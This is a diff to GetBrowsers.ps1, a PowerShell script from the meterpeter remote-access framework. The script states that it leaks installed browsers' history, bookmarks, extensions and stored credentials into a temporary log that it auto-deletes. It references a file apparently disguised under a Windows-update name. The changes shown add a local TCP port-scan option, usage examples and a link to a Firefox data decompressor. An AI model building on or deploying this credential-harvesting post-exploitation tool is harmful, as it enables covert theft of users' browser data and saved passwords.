@@ -11,7 +11,7 @@
    Standalone Powershell script to leak Installed browsers information sutch as: Home Page,
    Browsers Version, Accepted Language, Download Directory, History, Bookmarks, Extentions,
    StartPage, Stored Creds, Etc. The leaks will be saved to $env:TMP folder and Auto-deleted
-   in the end. Unless the 2 argument is used to input the Logfile permanent storage location.
+   in the end. Unless the 2º argument is used to input the Logfile permanent storage location.
 
 .NOTES
    PS C:\> Get-Help ./GetBrowsers.ps1 -full
@@ -39,8 +39,16 @@
    Enumerates Internet Explorer (IE|MsEdge), FireFox and Chrome Browsers information.
    
 .EXAMPLE
+   PS C:\> ./GetBrowsers.ps1 -CHROME $env:USERPROFILE\Desktop
+   Enumerates Chrome browser and saves logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log
+
+.EXAMPLE
    PS C:\> ./GetBrowsers.ps1 -ADDONS $env:USERPROFILE\Desktop
    Enumerates ALL Browsers addons and saves logfile to: $env:USERPROFILE\Desktop\BrowserEnum.log
+
+.EXAMPLE
+   PS C:\> ./GetBrowsers.ps1 -SCAN 80,135,139,445
+   Enumerates local host open|closed tcp ports (does not store the logfile)
 
 .INPUTS
    None. You cannot pipe objects to GetBrowsers.ps1
@@ -51,6 +59,7 @@
 .LINK
     https://github.com/r00t-3xp10it/meterpeter
     https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowsers.ps1
+    https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
 #>
 
 
@@ -68,7 +77,7 @@ $param1 = $args[0] # User Inputs [Arguments]
 $param2 = $args[1] # User Inputs [Arguments]
 $host.UI.RawUI.WindowTitle = " @GetBrowsers v1.18"
 ## Auto-Set @Args in case of User empty inputs (Set LogFile Path).
-If(-not($param2)){$LogFilePath = "$env:TMP"}else{$LogFilePath = "$param2";$mpset = $True}
+If(-not($param2)){$LogFilePath = "$env:TMP"}else{If($param2 -match '^[0-9]'){$LogFilePath = "$env:TMP";$param2 = $param2}else{$LogFilePath = "$param2";$mpset = $True}}
 If(-not($param1)){
     ## Required (Mandatory) Parameters/args Settings
     echo "`nGetBrowsers - Enumerate installed browser(s) information ." > $LogFilePath\BrowserEnum.log
@@ -84,7 +93,8 @@ If(-not($param1)){
     echo "./GetBrowsers.ps1 -ADDONS           Enumerates ALL browsers extentions installed." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -CREDS            Enumerates ALL browsers credentials stored.`n" >> $LogFilePath\BrowserEnum.log
     echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -IE `$env:TMP     Enumerates selected browser and stores logfile to 'tmp'.`n" >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates selected browser and stores logfile to 'tmp'." >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -SCAN 135,139,445 Enumerates Local host open|closed tcp ports.`n" >> $LogFilePath\BrowserEnum.log
     Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
         ## For those who insiste in running this script outside meterpeter
         If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){
@@ -827,12 +837,30 @@ function CREDS_DUMP {
 }
  
 
+ ## Function tcp port scanner
+ function PORTSCANNER {
+    If(-not($param2)){$PortRange = "22,80,139,445"}else{$PortRange = $param2}
+    $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
+    echo "`n`nRemote-Host   Status   Port" >> $LogFilePath\BrowserEnum.log
+    echo "-----------   ------   ----" >> $LogFilePath\BrowserEnum.log
+    $PortRange -split(',')|Foreach-Object -Process {
+        If((Test-NetConnection $Remote_Host -Port $_ -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true){
+            echo "$Remote_Host  Open     $_" >> $LogFilePath\BrowserEnum.log
+        }else{
+            echo "$Remote_Host  Closed   $_" >> $LogFilePath\BrowserEnum.log
+        }
+    }
+}
+
+
+
 ## Jump Links (Functions)
 If($param1 -eq "-IE"){IE_Dump}
 If($param1 -eq "-CHROME"){CHROME}
 If($param1 -eq "-ADDONS"){ADDONS}
 If($param1 -eq "-FIREFOX"){FIREFOX}
 If($param1 -eq "-CREDS"){CREDS_DUMP}
+If($param1 -eq "-SCAN"){PORTSCANNER}
 If($param1 -eq "-RECON"){BROWSER_RECON}
 If($param1 -eq "-ALL"){BROWSER_RECON;IE_Dump;FIREFOX;CHROME}
 
